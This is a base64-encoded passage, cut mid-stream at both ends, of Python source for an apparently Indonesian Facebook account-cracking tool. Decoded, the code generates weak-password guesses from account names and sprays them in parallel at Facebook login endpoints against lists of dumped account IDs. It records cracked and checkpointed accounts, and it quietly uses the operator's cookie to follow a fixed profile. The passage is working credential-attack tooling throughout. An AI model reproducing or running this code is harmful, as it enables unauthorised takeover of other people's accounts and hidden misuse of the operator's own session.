QuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikNCiAgICAgICAgICAgICAgICBvcGVuKCJ1YS50eHQiLCJ3Iikud3JpdGUodWFfKTtqZWRhKDIpDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcbiVzJXMgbWVuZ2d1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gIiUoSCx0aWwpKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICAgICAgb3BlbigidWEudHh0IiwidyIpLndyaXRlKHVhKTtqZWRhKDIpDQogICAgICAgICAgICBwcmludCAoIlxuJXMlcyBiZXJoYXNpbCBtZW5nZ2FudGkgdXNlciBhZ2VudCIlKEgsdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KCQkJZXhpdCAoIlx4MWJbMTs5MW3igKIgRXJyb3IgIikgDQogICAgZWxpZiBfcm9tel8gaW4oIjIiLCIwMiIpOg0KICAgICAgICB0cnk6DQogICAgICAgIAl1YV8gPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKTtqZWRhKDIpO3ByaW50ICgiJXMlcyVzIHVzZXIgYWdlbnQgYW5kYSVzIDogJXMlcyIlKFUsdGlsLE8sTSxILHVhXykpO2plZGEoMik7cmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJdWFfID0gJyVzLSclKE0pDQogICAgZWxpZiBfcm9tel8gaW4oIjAiLCIwMCIpOg0KICAgIAltZW51KCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAoJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCkpO2plZGEoMik7dWFzKF9yb216XykNCiMgU1RBUlQgQ1JBQ0sNCmRlZiBDb21iaW5hdGluKHRleHQpOg0KCWZvciB3IGluIHRleHQuc3BsaXQoIiAiKToNCgkJaWYgbGVuKHcpPDM6DQoJCQljb250aW51ZQ0KCQllbHNlOg0KCQkJdz13Lmxvd2VyKCkNCgkJCWlmIGxlbih3KT09MyBvciBsZW4odyk9PTQgb3IgbGVuKHcpPT01Og0KCQkJCXB3eCA9IFt3KycxMjMnLHcrJzEyMzQnLHcrJzEyMzQ1Jyx3LHRleHQubG93ZXIoKV0NCgkJCWVsc2U6DQoJCQkJcHd4ID0gW3crJzEyMycsdysnMTIzNCcsdysnMTIzNDUnLHddDQoJcmV0dXJuIHB3eA0KZGVmIGlrdXRpX2d3KGt1a2lzKToNCgl0cnk6DQoJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQlrdWVoICA9IHsiY29va2llIjprdWtpc30NCgkJcj1wYXJzZXIoc2VzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MSIsY29va2llcz1rdWVoKS50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWZvciBpa3V0IGluIHIuZmluZF9hbGwoImEiKToNCgkJCWlmICJCZXJoZW50aSBtZW5naWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlicmVhaw0KCQkJZWxpZiAiSWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlzZXMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2lrdXRbImhyZWYiXSxjb29raWVzPWt1ZWgpDQoJZXhjZXB0OiBwYXNzDQpwd3ggPSBbXQ0KY2xhc3MgbmdlbnRvZDoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogICAgICAgIHNlbGYub3BzaV9jID0gW10NCiAgICAgICAgc2VsZi5nbSA9IFtdDQogICAgICAgIHNlbGYudWJhaF9wYXNzID0gW10NCiAgICAgICAgc2VsZi5wd2JhcnUgPSBbXQ0KICAgICAgICBzZWxmLnVnZW4gPSBbXQ0KICAgICAgICBzZWxmLnB3QmFydSA9IFtdDQogICAgICAgIHNlbGYudXJsID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCiAgICANCiAgICBkZWYgdWJhaHB3KHNlbGYpOg0KCQlwdz1yYXdfaW5wdXQoIiVzJXMlcyB1YmFoIHNhbmRpIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgcHcgaW5bJyddOg0KCQkJcHJpbnQoIiVz4oCiIGlzaSB5ZyBiZW5hciBrZW50b2QgIiUoTSkpDQoJCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCQlzZWxmLnViYWhfcGFzcy5hcHBlbmQoInViYWgiKQ0KCQkJcHcyPXJhd19pbnB1dCgiJXMlcyVzIG1hc3VrYW4gc2FuZGkgJXM+ICVzIiUoVSx0aWwsTyxNLEspKTtwcmludCcnDQoJCQlpZiBsZW4ocHcyKSA8PSA1Og0KCQkJCWV4aXQoIiVz4oCiIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciAiJShNKSkNCgkJCWVsc2U6DQoJCQkJc2VsZi5wd2JhcnUuYXBwZW5kKHB3MikNCgkJZWxzZToNCgkJCXBhc3MNCiAgICANCiAgICBkZWYgb3BzaV9jcihzZWxmKToNCiAgICAJamFsYW4gKCJcbiVz4oCiICVzbXVuY3Vsa2FuIG9wc2kgY2hlY2twb2ludCByYXdhbiBzcGFtIGhhbCB5YW5nIHdhamFyIGppa2EgaGFzaWwgbnlhIHNlZGlraXQiJShVLE8pKQ0KICAgIAlvcCA9IHJhd19pbnB1dCgnXG4lc+KAoiVzIGd1bmFrYW4gb3BzaSBjaGVja3BvaW50PyB5L3QlcyA+ICVzJyUoVSxPLE0sSykpDQogICAgICAgIGlmIG9wID09Jyc6DQogICAgICAgIAlwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLm9wc2lfY3IoKQ0KICAgICAgICBlbGlmIG9wIGluWydZJywneSddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJtdW5jdWwiKQ0KICAgICAgICAJc2VsZi51YmFocHcoKQ0KICAgICAgICBlbGlmIG9wIGluWyd0JywnVCddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJna19tdW5jdWwiKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgdWFfcmFuKHNlbGYpOg0KICAgIAlvcCA9IHJhd19pbnB1dCgnJXPigKIlcyBpbmdpbiBndW5ha2FuIHVhIHJhbmRvbT8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiBvcCA9PScnOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICAgICAgZWxpZiBvcCBpblsnWScsJ3knXToNCiAgICAgICAgCXNlbGYudWdlbi5hcHBlbmQoInJhbmRvbSIpDQogICAgICAgIGVsaWYgb3AgaW5bJ3QnLCdUJ106DQogICAgICAgIAlzZWxmLnVnZW4uYXBwZW5kKCJna19yYW5kb20iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgcm9taXkoc2VsZik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGphbGFuICgiXG4lc+KAoiAlc3NlYmVsdW0gY3JhY2sgYW5kYSB3YWppYiBkdW1wIGlkIHRlcmxlYmloIGRhaHVsdSBwaWxpaCBhbnRhcmEgbWVudSAlczEtNiIlKFUsTyxQKSkNCiAgICAgICAgICAgIHNlbGYuYXBrID0gcmF3X2lucHV0KCdcbiVz4oCiJXMgZmlsZSBkdW1wICVzPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICAgICAgc2VsZi5pZCA9IG9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIlcyBqdW1sYWggSWQlcyA+ICVzJXMnICUoVSxPLE0sSCxsZW4oc2VsZi5pZCkpKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgRmlsZSBkdW1wIHRpZGFrIGFkYSwgZHVtcCBpZCBkdWx1IGtlbnRvZCclKE0pKQ0KICAgICAgICAgICAgcmF3X2lucHV0KCdcbiVz4oCiICVzWyAlc2VudGVyICVzXSAnJShVLE8sVSxPKSk7bWVudSgpDQogICAgICAgIHNlbGYub3BzaV9jcigpDQogICAgICAgIHNlbGYudWFfcmFuKCkNCiAgICAgICAgdW5pa2VycyA9IHJhd19pbnB1dCgnJXPigKIlcyBndW5ha2FuIHBhc3N3b3JkIG1hbnVhbD8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiB1bmlrZXJzIGluICgnWScsICd5Jyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBjb250b2glcyA+JXMgc2F5YW5nJXMsJXNwZW5nZW4lcywlc25nZW50b3QnJShVLE8sTSxPLE0sTyxNLE8pKQ0KICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICBwd3ggPSByYXdfaW5wdXQoJyVz4oCiJXMgcGFzc3dvcmQgJXM+ICVzJyUoVSxPLE0sSykpDQogICAgICAgICAgICAgICAgaWYgcHd4ID09ICcnOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgamFuZ2FuIGtvc29uZyAnJShNKSkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihwd3gpPD01Og0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgcGFzc3dvcmQgbWluaW1hbCA2IGthcmFrdGVyJyUoTSkpO2V4aXQoKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRlZiBtYW51YWwoYnJ1dGU9Tm9uZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpbmQgPSByYXdfaW5wdXQoJ1xuJXMjJXMgUGlsaWggJXM+JXMgJyUoUCxPLE0sSykpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbmQgPT0gJyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7bWFudWFsKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgaW5kIGluICgnMScsICcwMScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFrdW4gaW4gc2VsZi5pZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfaGVja18gPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5iX2FwaSwgX2hlY2tfLCBicnV0ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBpbmQgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWt1biBpbiBzZWxmLmlkOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9oZWNrXyA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCBfaGVja18sIGJydXRlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGluZCBpbiAoJzMnLCAnMDMnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBha3VuIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2hlY2tfID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYubW9iaWwsIF9oZWNrXywgYnJ1dGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCclKE0pKTttYW51YWwoKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBbICVzcGlsaWggbWV0aG9kZSBsb2dpbiwgc2lsYWhrYW4gY29iYSBzYXR1wrIgJXNdXG4nJShVLE8sVSxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAxJXMgbWV0aG9kZSAlc2ItYXBpICVzKGNlcGF0KSAnJShVLFAsTyxNLE8pKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDIlcyBtZXRob2RlICVzbWJhc2ljICVzKGxhbWJhdCkgJyUoVSxQLE8sUCxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAzJXMgbWV0aG9kZSAlc21vYmlsZSAlcyhsYW1iYXQpICVzUHJvJyUoVSxQLE8sSCxPLEgpKQ0KICAgICAgICAgICAgICAgICAgICBtYW51YWwocHd4LnNwbGl0KCcsJykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgdW5pa2VycyBpbiAoJ1QnLCAndCcpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiJXMgWyAlc3BpbGloIG1ldGhvZGUgbG9naW4sIHNpbGFoa2FuIGNvYmEgc2F0dcKyJXMgXVxuJyUoVSxPLFUsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDElcyBtZXRob2RlICVzYi1hcGkgJXMoY2VwYXQpJyUoVSxQLE8sTSxPKSkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIgJXMwMiVzIG1ldGhvZGUgJXNtYmFzaWMgJXMobGFtYmF0KSclKFUsUCxPLFAsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDMlcyBtZXRob2RlICVzbW9iaWxlICVzKGxhbWJhdCkgJXNQcm8nJShVLFAsTyxILE8sSCkpDQogICAgICAgICAgICBzZWxmLmxhbmdzdW5nKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCIlc+KAoiBJc2kgeWFuZyBiZW5hciBrZW50b2QgIiUoTSkpO2plZGEoMik7bWVudSgpDQogICAgIyBMQU5HU1VORw0KICAgIGRlZiBsYW5nc3VuZyhzZWxmKToNCiAgICAJZ2xvYmFsIHB3eA0KICAgICAgICBzdXV1ID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiVzICclKFAsTyxNLEspKQ0KICAgICAgICBpZiBzdXV1ID09ICcnOg0KICAgICAgICAgICAgcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5sYW5nc3VuZygpDQogICAgICAgIGVsaWYgc3V1dSBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgIAlmb3IgYWt1biBpbiBzZWxmLmlkOiANCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICBwdyA9IGFrdW4uc3BsaXQoJzw9PicpWzFdDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdyBpbiBwdy5zcGxpdCgiICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih3KTwzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXc9dy5sb3dlcigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXB3eCA9IENvbWJpbmF0aW4ocHcpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYuYl9hcGksIHVzZXIsIHB3eCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICBlbGlmIHN1dXUgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAJZm9yIGFrdW4gaW4gc2VsZi5pZDogDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHcgPSBha3VuLnNwbGl0KCc8PT4nKVsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHcgaW4gcHcuc3BsaXQoIiAiKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odyk8MzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAl3PXcubG93ZXIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAlwd3ggPSBDb21iaW5hdGluKHB3KQ0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCB1c2VyLCBwd3gpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgZWxpZiBzdXV1IGluICgnMycsICcwMycpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgCWZvciBha3VuIGluIHNlbGYuaWQ6IA0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHB3ID0gYWt1bi5zcGxpdCgnPD0+JylbMV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB3IGluIHB3LnNwbGl0KCIgIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHcpPDM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJdz13Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJcHd4ID0gQ29tYmluYXRpbihwdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5tb2JpbCwgdXNlciwgcHd4KQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLmxhbmdzdW5nKCkNCiAgICMgQl9BUEkNCiAgICBkZWYgYl9hcGkoc2VsZiwgdXNlciwgbWFudWFsKToNCiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAgICAgZm9yIHB3IGluIG1hbnVhbDoNCiAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICB1YV9waSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSB